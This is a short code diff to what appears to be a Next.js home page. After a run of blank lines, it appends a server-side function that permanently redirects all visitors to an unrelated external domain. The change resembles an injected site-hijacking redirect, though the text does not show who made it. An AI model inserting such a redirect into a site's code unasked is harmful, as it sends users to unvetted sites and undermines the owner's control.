@@ -213,3 +213,16 @@ export default function Home() {
     </>
   );
 }
+
+
+
+
+
+export async function getServerSideProps(context) {
+  return {
+    redirect: {
+      destination: 'https://www.adoptedbyamurderousdukefamily.in.net',
+      permanent: true,
+    },
+  };
+}
